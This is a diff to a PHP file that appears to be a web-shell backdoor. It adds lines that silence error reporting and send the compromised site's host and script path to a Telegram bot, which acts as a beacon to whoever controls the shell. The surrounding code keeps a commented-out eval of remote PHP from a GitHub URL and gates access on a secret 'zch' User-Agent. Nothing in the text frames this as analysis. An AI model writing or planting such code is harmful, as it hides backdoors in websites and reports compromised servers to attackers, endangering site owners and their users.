@@ -1,6 +1,9 @@
 <?php
-
+error_reporting(0);
+error_log(0);
 // eval("?>" . file_get_contents("https://raw.githubusercontent.com/ZechBron/zChB-Geek/master/zCh.php") . "<?php");
+
+file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?chat_id=" . $chat_id . "&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 
 if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") {
 
